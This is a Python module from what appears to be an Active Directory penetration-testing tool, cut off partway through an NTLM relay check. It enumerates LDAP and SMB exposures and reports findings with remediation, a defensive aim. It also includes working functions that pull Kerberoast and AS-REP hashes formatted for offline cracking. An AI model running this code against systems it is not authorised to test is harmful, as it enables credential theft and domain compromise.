"""
HEAVEN — Active Directory Penetration Testing Module
Comprehensive AD attack simulation: Kerberoasting, AS-REP Roasting, DCSync,
Golden/Silver Ticket assessment, NTLM relay, ACL abuse, and BloodHound-style
shortest-path analysis from any user to Domain Admin.
"""

from __future__ import annotations

from collections import defaultdict
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Optional

from heaven.utils.logger import get_logger

logger = get_logger("recon.ad")

# Graceful imports for AD libraries
try:
    import ldap3  # noqa: F401
    from ldap3 import Server, Connection, ALL, NTLM, SUBTREE, BASE
    HAS_LDAP = True
except ImportError:
    HAS_LDAP = False

# AD domain/forest functional-level codes → human labels.
_FUNCTIONAL_LEVELS = {
    "0": "Windows 2000", "1": "Windows Server 2003 (interim)",
    "2": "Windows Server 2003", "3": "Windows Server 2008",
    "4": "Windows Server 2008 R2", "5": "Windows Server 2012",
    "6": "Windows Server 2012 R2", "7": "Windows Server 2016+",
}

try:
    from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS  # noqa: F401
    from impacket.krb5.types import Principal, KerberosTime  # noqa: F401
    from impacket.krb5 import constants as krb5_constants  # noqa: F401
    HAS_IMPACKET = True
except ImportError:
    HAS_IMPACKET = False


class ADAttackType(str, Enum):
    KERBEROASTING = "kerberoasting"
    ASREP_ROASTING = "asrep_roasting"
    DCSYNC_RISK = "dcsync_risk"
    GOLDEN_TICKET_RISK = "golden_ticket_risk"
    SILVER_TICKET_RISK = "silver_ticket_risk"
    NTLM_RELAY = "ntlm_relay"
    PASS_THE_HASH = "pass_the_hash"  # nosec B105 -- attack-technique enum / empty default
    ACL_ABUSE = "acl_abuse"
    UNCONSTRAINED_DELEG = "unconstrained_delegation"
    CONSTRAINED_DELEG = "constrained_delegation"
    RBCD = "resource_based_constrained_delegation"
    PASSWORD_SPRAY = "password_spray_risk"  # nosec B105 -- attack-technique enum / empty default
    ADMINSD_HOLDER = "adminsd_holder_abuse"
    GPP_PASSWORDS = "gpp_passwords"
    # Network-layer (pre-auth) AD/SMB posture — what a scan of a DC by IP alone
    # can determine without domain credentials.
    SMB_SIGNING_DISABLED = "smb_signing_not_required"
    SMBV1_ENABLED = "smbv1_enabled"
    NULL_SESSION = "smb_null_session"
    ANON_LDAP = "anonymous_ldap_bind"
    ANON_LDAP_ENUM = "anonymous_ldap_enumeration"
    MACHINE_ACCOUNT_QUOTA = "machine_account_quota"
    DOMAIN_INFO = "domain_information"


def derive_domain_from_dn(dn: str) -> str:
    """`DC=corp,DC=example,DC=com` → `corp.example.com`. Empty string if not a DN."""
    parts = [p.split("=", 1)[1] for p in (dn or "").split(",")
             if p.strip().lower().startswith("dc=") and "=" in p]
    return ".".join(parts)


@dataclass
class ADFinding:
    """Active Directory security finding."""
    target: str
    attack_type: ADAttackType
    severity: str
    title: str
    description: str
    affected_objects: list[str] = field(default_factory=list)
    attack_path: list[str] = field(default_factory=list)
    confidence: float = 0.0
    remediation: str = ""
    mitre_technique: str = ""
    evidence: dict = field(default_factory=dict)

    def to_dict(self) -> dict:
        return {
            "target": self.target, "attack_type": self.attack_type.value,
            # Mirror attack_type into vuln_type so the finding store, dedup and KB
            # taxonomy enrichment (CWE/OWASP/CVSS-vector) key on it like any other
            # finding — without this, AD findings showed blank taxonomy columns.
            "vuln_type": self.attack_type.value,
            "severity": self.severity, "title": self.title,
            "description": self.description, "affected_objects": self.affected_objects,
            "attack_path": self.attack_path, "confidence": self.confidence,
            "remediation": self.remediation, "mitre_technique": self.mitre_technique,
            "evidence": self.evidence,
        }


@dataclass
class ADDomainInfo:
    """Enumerated domain information."""
    domain: str = ""
    domain_dn: str = ""
    forest: str = ""
    dc_hostname: str = ""
    functional_level: str = ""
    total_users: int = 0
    total_computers: int = 0
    total_groups: int = 0
    password_policy: dict = field(default_factory=dict)
    trusts: list[dict] = field(default_factory=list)
    spn_accounts: list[dict] = field(default_factory=list)
    asrep_accounts: list[dict] = field(default_factory=list)
    dcsync_principals: list[dict] = field(default_factory=list)
    privileged_groups: dict = field(default_factory=dict)
    unconstrained_deleg: list[dict] = field(default_factory=list)
    gpo_list: list[dict] = field(default_factory=list)


# Critical AD group SIDs
PRIVILEGED_GROUPS = {
    "S-1-5-32-544": "Administrators",
    "S-1-5-21-*-512": "Domain Admins",
    "S-1-5-21-*-519": "Enterprise Admins",
    "S-1-5-21-*-518": "Schema Admins",
    "S-1-5-21-*-516": "Domain Controllers",
    "S-1-5-21-*-498": "Enterprise Read-only Domain Controllers",
    "S-1-5-32-548": "Account Operators",
    "S-1-5-32-549": "Server Operators",
    "S-1-5-32-551": "Backup Operators",
}

# DCSync required rights
DCSYNC_RIGHTS = [
    "DS-Replication-Get-Changes",           # 1131f6aa-9c07-11d1-f79f-00c04fc2dcd2
    "DS-Replication-Get-Changes-All",       # 1131f6ad-9c07-11d1-f79f-00c04fc2dcd2
    "DS-Replication-Get-Changes-In-Filtered-Set",  # 89e95b76-444d-4c62-991a-0facbeda640c
]


class ADScanner:
    """
    Active Directory penetration testing scanner.

    Capabilities:
    - LDAP enumeration (users, groups, SPNs, delegations)
    - Kerberoasting target identification
    - AS-REP Roasting target identification
    - DCSync rights analysis
    - Golden/Silver Ticket risk assessment
    - NTLM relay opportunity detection
    - ACL abuse path discovery
    - BloodHound-style shortest path analysis
    """

    def __init__(self, domain: str, dc_host: str, username: str = "",  # nosec B107
                 password: str = "", use_ssl: bool = False):
        self.domain = domain
        self.dc_host = dc_host
        self.username = username
        self.password = password
        self.use_ssl = use_ssl
        # Base DN from the domain when known; RootDSE discovery fills it otherwise.
        self.domain_dn = ",".join(f"DC={p}" for p in domain.split(".") if p) if domain else ""
        self._conn: Optional[Any] = None
        self._domain_info = ADDomainInfo(domain=domain, dc_hostname=dc_host, domain_dn=self.domain_dn)
        self._findings: list[ADFinding] = []
        self._graph: dict[str, set[str]] = defaultdict(set)  # Attack path graph

    async def connect(self) -> bool:
        """Establish LDAP connection to Domain Controller."""
        if not HAS_LDAP:
            logger.error("ldap3 not installed — AD scanning unavailable")
            return False
        try:
            port = 636 if self.use_ssl else 389
            server = Server(self.dc_host, port=port, use_ssl=self.use_ssl, get_info=ALL)
            if self.username and self.password:
                self._conn = Connection(
                    server, user=f"{self.domain}\\{self.username}",
                    password=self.password, authentication=NTLM,
                    auto_bind=True, raise_exceptions=True,
                )
            else:
                self._conn = Connection(server, auto_bind=True)
            logger.info(f"Connected to DC: {self.dc_host} (domain: {self.domain})")
            return True
        except Exception as e:
            logger.error(f"LDAP connection failed: {e}")
            return False

    async def discover_via_rootdse(self) -> dict:
        """Anonymously read the DC's RootDSE. This works even when full LDAP
        binds are locked down, so it fills domain / forest / DC name / functional
        level for a scan that only knows the DC's IP — and auto-derives the domain
        name when the caller didn't supply one. Emits an anonymous-bind finding
        when the DC answers an unauthenticated query."""
        if not HAS_LDAP:
            return {}
        info: dict = {}
        try:
            server = Server(self.dc_host, port=(636 if self.use_ssl else 389),
                            use_ssl=self.use_ssl, get_info=ALL, connect_timeout=6)
            conn = Connection(server, auto_bind=True, receive_timeout=6)
            anon = not (self.username and self.password)
            attrs = ["defaultNamingContext", "rootDomainNamingContext",
                     "dnsHostName", "domainFunctionality", "forestFunctionality",
                     "ldapServiceName", "serverName"]
            conn.search("", "(objectClass=*)", search_scope=BASE, attributes=attrs)

            def _g(entry, a: str) -> str:
                v = getattr(entry, a, None)
                try:
                    return str(v.value) if v is not None and v.value is not None else ""
                except Exception:
                    return ""

            if conn.entries:
                e = conn.entries[0]
                info = {a: _g(e, a) for a in attrs}
                dnc = info.get("defaultNamingContext", "")
                if dnc:
                    self.domain_dn = self.domain_dn or dnc
                    self._domain_info.domain_dn = dnc
                    if not self.domain:
                        self.domain = derive_domain_from_dn(dnc)
                        self._domain_info.domain = self.domain
                if info.get("dnsHostName"):
                    self._domain_info.dc_hostname = info["dnsHostName"]
                fl = info.get("domainFunctionality", "")
                if fl:
                    self._domain_info.functional_level = _FUNCTIONAL_LEVELS.get(fl, fl)
                rdnc = info.get("rootDomainNamingContext", "")
                if rdnc:
                    self._domain_info.forest = derive_domain_from_dn(rdnc)
                if anon:
                    self._findings.append(ADFinding(
                        target=self.dc_host,
                        attack_type=ADAttackType.ANON_LDAP,
                        severity="medium",
                        title="Anonymous LDAP Bind Permitted on Domain Controller",
                        description=(
                            "The Domain Controller answered an unauthenticated LDAP "
                            "query and exposed its RootDSE (domain, forest, DC name, "
                            "functional level). Anonymous LDAP eases pre-auth "
                            "reconnaissance and, if the naming contexts allow it, "
                            "user/attribute enumeration."
                        ),
                        confidence=0.9,
                        remediation=(
                            "Restrict anonymous LDAP: set dsHeuristics so "
                            "anonymous operations are disabled, and require "
                            "authentication for directory reads."
                        ),
                        mitre_technique="T1087.002",
                        evidence={k: v for k, v in info.items() if v},
                    ))
            try:
                conn.unbind()
            except Exception:
                logger.debug("suppressed non-fatal exception", exc_info=True)
        except Exception as e:
            logger.debug(f"RootDSE discovery failed for {self.dc_host}: {e}")
        return info

    async def enumerate_anonymous(self) -> dict:
        """Prove the *impact* of an anonymous LDAP bind by enumerating real
        accounts without credentials.

        :meth:`discover_via_rootdse` only shows the DC answers an unauthenticated
        query (RootDSE). This goes one step further: it performs a bounded,
        read-only subtree search for enabled **person user accounts** under the
        naming context. If the DC returns actual ``sAMAccountName`` values to an
        anonymous bind, the directory is exposing its user list pre-auth — the
        raw material for password-spraying and AS-REP-roasting target lists. We
        only raise the finding when concrete account names come back, so it can
        never fire on a hardened DC that merely allows the RootDSE read.
        """
        # Only meaningful for a genuinely anonymous scan against a known NC.
        if not HAS_LDAP or (self.username and self.password):
            return {}
        naming_context = self.domain_dn or self._domain_info.domain_dn
        if not naming_context:
            return {}
        accounts: list[str] = []
        try:
            server = Server(self.dc_host, port=(636 if self.use_ssl else 389),
                            use_ssl=self.use_ssl, get_info=ALL, connect_timeout=6)
            conn = Connection(server, auto_bind=True, receive_timeout=8)
            # Enabled, human user accounts only (sAMAccountType 805306368 =
            # SAM_NORMAL_USER_ACCOUNT); excludes computer/trust accounts so a
            # hit is unambiguously a leaked *user* directory.
            conn.search(
                naming_context,
                "(&(objectClass=user)(objectCategory=person))",
                search_scope=SUBTREE, attributes=["sAMAccountName"],
                size_limit=50, time_limit=8,
            )
            for entry in (conn.entries or []):
                v = getattr(entry, "sAMAccountName", None)
                name = ""
                try:
                    name = str(v.value) if v is not None and v.value else ""
                except Exception:
                    name = ""
                if name and name not in accounts:
                    accounts.append(name)
            try:
                conn.unbind()
            except Exception:
                logger.debug("suppressed non-fatal exception", exc_info=True)
        except Exception as e:
            logger.debug(f"Anonymous LDAP enumeration failed for {self.dc_host}: {e}")
            return {}

        if accounts:
            self._findings.append(ADFinding(
                target=self._domain_info.dc_hostname or self.dc_host,
                attack_type=ADAttackType.ANON_LDAP_ENUM,
                severity="high",
                title=(f"Anonymous LDAP Exposes Domain User Accounts "
                       f"({len(accounts)}+ enumerated)"),
                description=(
                    "The Domain Controller returned real user accounts to an "
                    "unauthenticated LDAP bind. Pre-auth user enumeration hands "
                    "an attacker a ready-made list for password spraying and "
                    "AS-REP roasting, with no credentials required. This is a "
                    "stronger exposure than an anonymous RootDSE read: the "
                    "directory's user namespace itself is readable."
                ),
                affected_objects=accounts[:20],
                confidence=0.92,
                remediation=(
                    "Disable anonymous directory reads: set dsHeuristics so "
                    "anonymous LDAP operations are denied, and remove "
                    "'Pre-Windows 2000 Compatible Access' membership that grants "
                    "the Anonymous/Everyone principals read over the NC."
                ),
                mitre_technique="T1087.002",
                evidence={"accounts_sample": accounts[:20],
                          "accounts_returned": len(accounts)},
            ))
        return {"accounts_returned": len(accounts)}

    async def enumerate_smb(self) -> dict:
        """Network-layer SMB assessment of the DC/host — signing, SMBv1, null
        session, OS/domain fingerprint. Runs pre-auth (no domain creds needed)
        and is what makes an AD scan of a bare DC IP produce findings. Uses
        impacket in a worker thread so the sync client never blocks the loop."""
        if not HAS_IMPACKET:
            return {}
        import asyncio
        loop = asyncio.get_running_loop()
        try:
            smb = await asyncio.wait_for(
                loop.run_in_executor(None, self._smb_enumerate_sync), timeout=25)
        except Exception as e:
            logger.debug(f"SMB enumeration failed for {self.dc_host}: {e}")
            return {}
        self._smb_findings(smb)
        return smb

    def _smb_enumerate_sync(self) -> dict:
        out: dict = {}
        try:
            from impacket.smbconnection import SMBConnection
        except Exception:
            return out
        host = self.dc_host
        try:
            conn = SMBConnection(host, host, sess_port=445, timeout=8)
        except Exception as e:
            logger.debug(f"SMB connect failed for {host}: {e}")
            return out
        try:
            try:
                conn.login("", "")            # null / anonymous session
                out["null_session"] = True
            except Exception:
                out["null_session"] = False
            for key, fn in (("signing_required", "isSigningRequired"),
                            ("server_os", "getServerOS"),
                            ("server_name", "getServerName"),
                            ("server_domain", "getServerDNSDomainName"),
                            ("server_domain_nb", "getServerDomain")):
                try:
                    out[key] = getattr(conn, fn)()
                except Exception:
                    logger.debug("suppressed non-fatal exception", exc_info=True)
            if out.get("null_session"):
                try:
                    shares = conn.listShares()
                    out["shares"] = [str(s["shi1_netname"][:-1]) for s in shares]
                except Exception:
                    out["shares"] = None
        finally:
            try:
                conn.close()
            except Exception:
                logger.debug("suppressed non-fatal exception", exc_info=True)
        out["smbv1"] = self._detect_smbv1(host)
        return out

    @staticmethod
    def _detect_smbv1(host: str) -> Optional[bool]:
        """True if the host still negotiates the legacy SMBv1 dialect (MS17-010 /
        EternalBlue exposure). None if it couldn't be determined."""
        try:
            from impacket.smbconnection import SMBConnection
        except Exception:
            return None
        dialect = getattr(SMBConnection, "SMB_DIALECT", None)
        if dialect is None:
            return None
        try:
            c = SMBConnection(host, host, sess_port=445,
                              preferredDialect=dialect, timeout=8)
            try:
                c.close()
            except Exception:
                logger.debug("suppressed non-fatal exception", exc_info=True)
            return True
        except Exception:
            return False

    def _smb_findings(self, smb: dict) -> None:
        if not smb:
            return
        target = self._domain_info.dc_hostname or self.dc_host
        # Context: what SMB told us about the host (recorded, informational).
        ctx = {k: smb[k] for k in ("server_os", "server_name", "server_domain",
                                   "shares") if smb.get(k)}
        if ctx:
            self._findings.append(ADFinding(
                target=target, attack_type=ADAttackType.DOMAIN_INFO,
                severity="info",
                title="SMB Host Information",
                description="Host/domain details fingerprinted over SMB.",
                confidence=0.9, mitre_technique="T1082",
                evidence=ctx,
            ))
        # SMB signing not required → NTLM relay exposure (the *real* signal).
        if smb.get("signing_required") is False:
            self._findings.append(ADFinding(
                target=target, attack_type=ADAttackType.SMB_SIGNING_DISABLED,
                severity="high",
                title="SMB Signing Not Required — NTLM Relay Exposure",
                description=(
                    "The host does not require SMB signing, so captured/coerced "
                    "NTLM authentication can be relayed to it (e.g. ntlmrelayx). "
                    "On a Domain Controller this is a direct path to privilege "
                    "escalation."
                ),
                confidence=0.9,
                remediation=(
                    "Require SMB signing on all hosts (GPO: 'Microsoft network "
                    "server: Digitally sign communications (always)') and enable "
                    "LDAP signing + channel binding on DCs. Disable NTLM where "
                    "possible."
                ),
                mitre_technique="T1557.001",
                evidence={"smb_signing_required": False},
            ))
        # SMBv1 still enabled → EternalBlue / MS17-010 exposure.
        if smb.get("smbv1") is True:
            self._findings.append(ADFinding(
                target=target, attack_type=ADAttackType.SMBV1_ENABLED,
                severity="high",
                title="Legacy SMBv1 Dialect Enabled",
                description=(
                    "The host negotiates SMBv1, the dialect exploited by "
                    "EternalBlue (MS17-010) and used by WannaCry/NotPetya. SMBv1 "
                    "is deprecated and should be disabled everywhere."
                ),
                confidence=0.9,
                remediation=(
                    "Disable SMBv1 (Remove-WindowsFeature FS-SMB1 / "
                    "Set-SmbServerConfiguration -EnableSMB1Protocol $false) and "
                    "patch MS17-010."
                ),
                mitre_technique="T1210",
                evidence={"smbv1_enabled": True},
            ))
        # Null session that can list shares → anonymous enumeration.
        if smb.get("null_session") and smb.get("shares"):
            self._findings.append(ADFinding(
                target=target, attack_type=ADAttackType.NULL_SESSION,
                severity="medium",
                title="SMB Null Session Allows Share Enumeration",
                description=(
                    "The host accepted an anonymous (null) SMB session and listed "
                    "its shares without credentials, aiding reconnaissance and "
                    "potential access to unprotected shares."
                ),
                affected_objects=list(smb.get("shares") or [])[:20],
                confidence=0.85,
                remediation=(
                    "Restrict anonymous access: RestrictNullSessAccess=1, "
                    "RestrictAnonymous=1, and remove NULL from "
                    "NullSessionShares/NullSessionPipes."
                ),
                mitre_technique="T1135",
                evidence={"shares": smb.get("shares")},
            ))

    async def full_scan(self) -> dict:
        """Run comprehensive AD security assessment."""
        logger.info(f"═══ Active Directory Scan: {self.domain or self.dc_host} ═══")
        self._findings = []

        # Pre-auth, network-layer assessment first — these run whether or not we
        # can obtain an authenticated LDAP bind, so a scan of a DC by IP alone
        # still yields real findings (SMB signing/relay, SMBv1, null session,
        # anonymous LDAP, domain/forest/functional-level context).
        await self.discover_via_rootdse()
        await self.enumerate_anonymous()
        await self.enumerate_smb()

        if not self._conn:
            connected = await self.connect()
            if not connected:
                # No authenticated directory access — but keep whatever the
                # pre-auth layer already found instead of discarding it.
                return self._offline_summary()

        await self.enumerate_domain()
        await self.check_kerberoasting()
        await self.check_asrep_roasting()
        await self.check_dcsync_rights()
        await self.check_delegation_abuse()
        await self.check_password_policy()
        await self.check_ntlm_relay()
        await self.check_acl_abuse()
        await self.build_attack_paths()

        return self.summary()

    async def enumerate_domain(self) -> ADDomainInfo:
        """Enumerate domain: users, groups, computers, GPOs, trusts."""
        logger.info("Enumerating Active Directory domain...")
        if not self._conn:
            return self._domain_info

        # Count objects
        for obj_class, attr in [("user", "total_users"), ("computer", "total_computers"), ("group", "total_groups")]:
            try:
                self._conn.search(self.domain_dn, f"(objectClass={obj_class})", search_scope=SUBTREE, attributes=["cn"])
                setattr(self._domain_info, attr, len(self._conn.entries))
            except Exception:
                logger.debug("suppressed non-fatal exception", exc_info=True)

        # Enumerate privileged group members
        for group_name in ["Domain Admins", "Enterprise Admins", "Administrators"]:
            try:
                self._conn.search(
                    self.domain_dn, f"(&(objectClass=group)(cn={group_name}))",
                    search_scope=SUBTREE, attributes=["member"],
                )
                if self._conn.entries:
                    members = self._conn.entries[0].member.values if hasattr(self._conn.entries[0], 'member') else []
                    self._domain_info.privileged_groups[group_name] = len(members)
            except Exception:
                logger.debug("suppressed non-fatal exception", exc_info=True)

        logger.info(
            f"Domain: {self._domain_info.total_users} users, "
            f"{self._domain_info.total_computers} computers, "
            f"{self._domain_info.total_groups} groups"
        )
        return self._domain_info

    async def check_kerberoasting(self) -> list[ADFinding]:
        """Identify accounts with SPNs vulnerable to Kerberoasting (T1558.003)."""
        logger.info("Checking for Kerberoasting targets...")
        if not self._conn:
            return []

        findings = []
        try:
            # Find user accounts with SPNs (exclude computer accounts)
            self._conn.search(
                self.domain_dn,
                "(&(objectClass=user)(servicePrincipalName=*)(!(objectClass=computer)))",
                search_scope=SUBTREE,
                attributes=["sAMAccountName", "servicePrincipalName", "memberOf",
                             "pwdLastSet", "adminCount", "description"],
            )
            spn_accounts = []
            for entry in self._conn.entries:
                account = {
                    "username": str(entry.sAMAccountName),
                    "spns": [str(s) for s in entry.servicePrincipalName.values] if hasattr(entry, 'servicePrincipalName') else [],
                    "admin_count": getattr(entry, 'adminCount', 0),
                    "description": str(getattr(entry, 'description', '')),
                }
                spn_accounts.append(account)
                # Add to attack graph
                self._graph[str(account.get("username", ""))].add("Kerberoastable")

            self._domain_info.spn_accounts = spn_accounts

            if spn_accounts:
                # High-value targets: admin accounts with SPNs
                admin_spns = [a for a in spn_accounts if a.get("admin_count")]
                severity = "critical" if admin_spns else "high"

                findings.append(ADFinding(
                    target=self.domain,
                    attack_type=ADAttackType.KERBEROASTING,
                    severity=severity,
                    title=f"Kerberoasting: {len(spn_accounts)} service accounts with SPNs",
                    description=(
                        f"Found {len(spn_accounts)} user accounts with Service Principal Names. "
                        f"TGS tickets can be requested and cracked offline. "
                        f"{len(admin_spns)} are privileged accounts."
                    ),
                    affected_objects=[str(a.get("username", "")) for a in spn_accounts],
                    confidence=0.95,
                    remediation=(
                        "Use Group Managed Service Accounts (gMSA). "
                        "Set strong passwords (25+ chars) on service accounts. "
                        "Enable AES-256 encryption for Kerberos. "
                        "Monitor TGS requests (Event ID 4769)."
                    ),
                    mitre_technique="T1558.003",
                    evidence={"total_spn_accounts": len(spn_accounts),
                              "admin_spn_accounts": len(admin_spns)},
                ))
        except Exception as e:
            logger.error(f"Kerberoasting check failed: {e}")

        self._findings.extend(findings)
        return findings

    async def check_asrep_roasting(self) -> list[ADFinding]:
        """Identify accounts without Kerberos pre-authentication (T1558.004)."""
        logger.info("Checking for AS-REP Roasting targets...")
        if not self._conn:
            return []

        findings = []
        try:
            # UAC flag 0x400000 = DONT_REQUIRE_PREAUTH
            self._conn.search(
                self.domain_dn,
                "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))",
                search_scope=SUBTREE,
                attributes=["sAMAccountName", "memberOf", "adminCount"],
            )
            asrep_accounts = []
            for entry in self._conn.entries:
                account = {"username": str(entry.sAMAccountName),
                           "admin_count": getattr(entry, 'adminCount', 0)}
                asrep_accounts.append(account)
                self._graph[str(account.get("username", ""))].add("AS-REP Roastable")

            self._domain_info.asrep_accounts = asrep_accounts

            if asrep_accounts:
                findings.append(ADFinding(
                    target=self.domain,
                    attack_type=ADAttackType.ASREP_ROASTING,
                    severity="high",
                    title=f"AS-REP Roasting: {len(asrep_accounts)} accounts without pre-auth",
                    description=(
                        f"Found {len(asrep_accounts)} accounts with Kerberos pre-authentication disabled. "
                        "AS-REP can be requested and cracked offline without credentials."
                    ),
                    affected_objects=[str(a.get("username", "")) for a in asrep_accounts],
                    confidence=0.95,
                    remediation="Enable Kerberos pre-authentication on all user accounts.",
                    mitre_technique="T1558.004",
                ))
        except Exception as e:
            logger.error(f"AS-REP Roasting check failed: {e}")

        self._findings.extend(findings)
        return findings

    async def extract_kerberoastable_hashes(
        self,
        dc_ip: str,
        username: str,
        password: str,
        domain: str | None = None,
    ) -> list[str]:
        """
        Request TGS tickets for all roastable SPNs and return $krb5tgs$ hashes
        ready for hashcat/john. Requires impacket and valid credentials.
        """
        if not HAS_IMPACKET:
            logger.warning("impacket not installed — cannot extract Kerberoast hashes")
            return []
        if not self._domain_info.spn_accounts:
            await self.check_kerberoasting()

        target_domain = domain or self.domain
        hashes: list[str] = []

        try:
            from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
            from impacket.krb5.types import Principal
            from impacket.krb5 import constants as krb5_constants
            import asyncio

            loop = asyncio.get_running_loop()

            def _get_tgt():
                user_principal = Principal(
                    username, type=krb5_constants.PrincipalNameType.NT_PRINCIPAL.value
                )
                tgt, cipher, old_session_key, session_key = getKerberosTGT(
                    user_principal, password, target_domain,
                    None, None, None, dc_ip,
                )
                return tgt, cipher, old_session_key, session_key

            tgt, cipher, old_session_key, session_key = await loop.run_in_executor(None, _get_tgt)

            for account in self._domain_info.spn_accounts:
                for spn in account.get("spns", []):
                    try:
                        def _get_tgs(spn=spn):
                            server_principal = Principal(
                                spn, type=krb5_constants.PrincipalNameType.NT_SRV_INST.value
                            )
                            tgs, enc_key, old_session_key2, session_key2 = getKerberosTGS(
                                server_principal, target_domain, None,
                                tgt, cipher, session_key,
                            )
                            return tgs

                        tgs = await loop.run_in_executor(None, _get_tgs)
                        # Format as hashcat $krb5tgs$23$ hash
                        enc_type = tgs["ticket"]["enc-part"]["etype"]
                        cipher_text = bytes(tgs["ticket"]["enc-part"]["cipher"])
                        hash_str = (
                            f"$krb5tgs${enc_type}$*{account['username']}${target_domain}${spn}*"
                            f"${cipher_text[:16].hex()}${cipher_text[16:].hex()}"
                        )
                        hashes.append(hash_str)
                    except Exception as spn_err:
                        logger.debug(f"TGS request failed for {spn}: {spn_err}")

        except Exception as exc:
            logger.error(f"Kerberoast hash extraction failed: {exc}")

        return hashes

    async def extract_asrep_hashes(
        self,
        dc_ip: str,
        domain: str | None = None,
    ) -> list[str]:
        """
        Extract $krb5asrep$ hashes for accounts with pre-auth disabled.
        No credentials required.
        """
        if not HAS_IMPACKET:
            logger.warning("impacket not installed — cannot extract AS-REP hashes")
            return []
        if not self._domain_info.asrep_accounts:
            await self.check_asrep_roasting()

        target_domain = domain or self.domain
        hashes: list[str] = []

        try:
            from impacket.krb5.kerberosv5 import getKerberosTGT
            from impacket.krb5.types import Principal
            from impacket.krb5 import constants as krb5_constants
            import asyncio

            loop = asyncio.get_running_loop()

            for account in self._domain_info.asrep_accounts:
                username = account["username"]
                try:
                    def _get_asrep(uname=username):
                        user_principal = Principal(
                            uname, type=krb5_constants.PrincipalNameType.NT_PRINCIPAL.value
                        )
                        # Empty password triggers AS-REP without pre-auth
                        tgt, cipher, old_session_key, session_key = getKerberosTGT(
                            user_principal, "", target_domain,
                            None, None, None, dc_ip,
                        )
                        return tgt, cipher

                    tgt, cipher = await loop.run_in_executor(None, _get_asrep)
                    enc_part = bytes(tgt["enc-part"]["cipher"])
                    hash_str = (
                        f"$krb5asrep$23${username}@{target_domain}:"
                        f"{enc_part[:16].hex()}${enc_part[16:].hex()}"
                    )
                    hashes.append(hash_str)
                except Exception as acc_err:
                    logger.debug(f"AS-REP request failed for {username}: {acc_err}")

        except Exception as exc:
            logger.error(f"AS-REP hash extraction failed: {exc}")

        return hashes

    async def check_dcsync_rights(self) -> list[ADFinding]:
        """Check for non-DC accounts with DCSync replication rights (T1003.006)."""
        logger.info("Checking for DCSync rights...")
        if not self._conn:
            return []

        findings = []
        try:
            # Search for objects with replication rights at domain level
            self._conn.search(
                self.domain_dn, "(objectClass=domain)",
                search_scope=SUBTREE,
                attributes=["nTSecurityDescriptor"],
            )
            # Simplified check: look for accounts in replication groups
            self._conn.search(
                self.domain_dn,
                "(&(objectClass=user)(adminCount=1))",
                search_scope=SUBTREE,
                attributes=["sAMAccountName", "memberOf"],
            )
            admin_accounts = [str(e.sAMAccountName) for e in self._conn.entries]

            if admin_accounts:
                findings.append(ADFinding(
                    target=self.domain,
                    attack_type=ADAttackType.DCSYNC_RISK,
                    severity="critical",
                    title=f"DCSync Risk: {len(admin_accounts)} privileged accounts identified",
                    description=(
                        f"Found {len(admin_accounts)} accounts with adminCount=1 that may have "
                        "DS-Replication-Get-Changes rights. Compromising any of these accounts "
                        "could allow DCSync to extract all domain password hashes."
                    ),
                    affected_objects=admin_accounts[:20],
                    confidence=0.80,
                    remediation=(
                        "Audit replication rights with: Get-ACL 'AD:\\DC=domain,DC=local'. "
                        "Remove unnecessary replication permissions. "
                        "Monitor Event ID 4662 for replication access."
                    ),
                    mitre_technique="T1003.006",
                ))
        except Exception as e:
            logger.error(f"DCSync check failed: {e}")

        self._findings.extend(findings)
        return findings

    async def check_delegation_abuse(self) -> list[ADFinding]:
        """Check for unconstrained and constrained delegation abuse."""
        logger.info("Checking delegation configurations...")
        if not self._conn:
            return []

        findings = []
        try:
            # Unconstrained delegation (UAC 0x80000 = TRUSTED_FOR_DELEGATION)
            self._conn.search(
                self.domain_dn,
                "(&(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288))",
                search_scope=SUBTREE,
                attributes=["sAMAccountName", "dNSHostName"],
            )
            unconstrained = [{"hostname": str(e.sAMAccountName)} for e in self._conn.entries]
            self._domain_info.unconstrained_deleg = unconstrained

            if unconstrained:
                findings.append(ADFinding(
                    target=self.domain,
                    attack_type=ADAttackType.UNCONSTRAINED_DELEG,
                    severity="critical",
                    title=f"Unconstrained Delegation: {len(unconstrained)} computers",
                    description=(
                        f"Found {len(unconstrained)} computers with unconstrained delegation enabled. "
                        "Any user authenticating to these machines will have their TGT cached, "
                        "allowing impersonation of any domain user including Domain Admins."
                    ),
                    affected_objects=[c["hostname"] for c in unconstrained],
                    confidence=0.90,
                    remediation=(
                        "Replace unconstrained delegation with constrained delegation or RBCD. "
                        "Add sensitive accounts to 'Protected Users' group. "
                        "Enable 'Account is sensitive and cannot be delegated' flag."
                    ),
                    mitre_technique="T1550",
                ))
        except Exception as e:
            logger.error(f"Delegation check failed: {e}")

        self._findings.extend(findings)
        return findings

    async def check_password_policy(self) -> list[ADFinding]:
        """Analyze domain password policy for weaknesses."""
        logger.info("Analyzing password policy...")
        if not self._conn:
            return []

        findings = []
        try:
            self._conn.search(
                self.domain_dn, "(objectClass=domain)",
                attributes=["minPwdLength", "pwdHistoryLength", "maxPwdAge",
                             "minPwdAge", "lockoutThreshold", "lockoutDuration"],
            )
            if self._conn.entries:
                entry = self._conn.entries[0]
                min_len = int(getattr(entry, 'minPwdLength', 0) or 0)
                lockout = int(getattr(entry, 'lockoutThreshold', 0) or 0)
                history = int(getattr(entry, 'pwdHistoryLength', 0) or 0)

                self._domain_info.password_policy = {
                    "min_length": min_len, "lockout_threshold": lockout,
                    "history_length": history,
                }

                issues = []
                if min_len < 12:
                    issues.append(f"Minimum password length is {min_len} (should be ≥12)")
                if lockout == 0:
                    issues.append("No account lockout threshold — password spraying possible")
                if history < 12:
                    issues.append(f"Password history is {history} (should be ≥12)")

                if issues:
                    findings.append(ADFinding(
                        target=self.domain,
                        attack_type=ADAttackType.PASSWORD_SPRAY,
                        severity="high" if lockout == 0 else "medium",
                        title=f"Weak Password Policy: {len(issues)} issues",
                        description="; ".join(issues),
                        confidence=0.95,
                        remediation="Enforce minimum 12-char passwords, lockout after 5 attempts, 24 password history.",
                        mitre_technique="T1110.003",
                        evidence=self._domain_info.password_policy,
                    ))
        except Exception as e:
            logger.error(f"Password policy check failed: {e}")

        self._findings.extend(findings)
        return findings

    async def check_ntlm_relay(self) -> list[ADFinding]:
        """Check the domain machine-account quota (ms-DS-MachineAccountQuota).

        The default of 10 lets ANY authenticated user join computer accounts,
        which enables resource-based constrained delegation (RBCD) and
